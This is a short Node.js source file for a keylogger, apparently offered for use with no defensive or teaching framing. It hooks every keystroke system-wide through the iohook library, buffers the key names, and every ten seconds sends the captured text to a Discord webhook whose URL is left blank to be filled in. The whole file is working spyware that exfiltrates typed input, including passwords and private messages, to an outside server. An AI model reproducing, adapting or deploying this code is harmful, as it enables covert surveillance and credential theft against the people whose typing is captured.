//Dependencies
const Discord = require("discord.js")
const Keycode = require("keycode")
const IOHook = require("iohook")

//Variables
var Self = {
    webhook_link: "",
    keys: ""
}

const Webhook = new Discord.WebhookClient(Self.webhook_link.split("/")[Self.webhook_link.split("/").length-2], Self.webhook_link.split("/")[Self.webhook_link.split("/").length-1])

//Main
IOHook.on("keydown", (event)=>{
    if(Keycode.names[event.rawcode] == "enter"){
        Self.keys += "\n"
        return
    }else if(Keycode.names[event.rawcode] == "space"){
        Self.keys += " "
        return
    }else if(!Keycode.names[event.rawcode]){
        return
    }

    Self.keys += Keycode.names[event.rawcode]
})

IOHook.start()

setInterval(function(){
    if(Self.keys.length){
        Webhook.send(Self.keys).then(()=>{
            Self.keys = ""
        })
    }
}, 10000) //Seconds typed keys every 10 seconds
